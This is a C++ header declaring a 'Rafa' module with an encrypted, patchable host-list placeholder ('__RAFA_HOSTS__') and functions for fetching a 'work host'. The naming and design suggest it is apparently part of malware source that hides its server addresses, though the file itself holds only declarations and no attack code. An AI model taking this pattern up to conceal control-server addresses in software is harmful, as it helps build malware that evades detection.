#ifndef RafaH
#define RafaH

#include "AzConfig.h"


#define RAFAHOSTS_PARAM_SIZE      100
#define RAFAHOSTS_PARAM_NAME      "__RAFA_HOSTS__\0"

#ifdef DEBUGCONFIG
	#define RAFAHOSTS_PARAM_ENCRYPTED false
#else
	#define RAFAHOSTS_PARAM_ENCRYPTED true
#endif


namespace Rafa
{
	void Init();
	PCHAR Hosts();
	string GetWorkHost();
};

#endif //RafaH
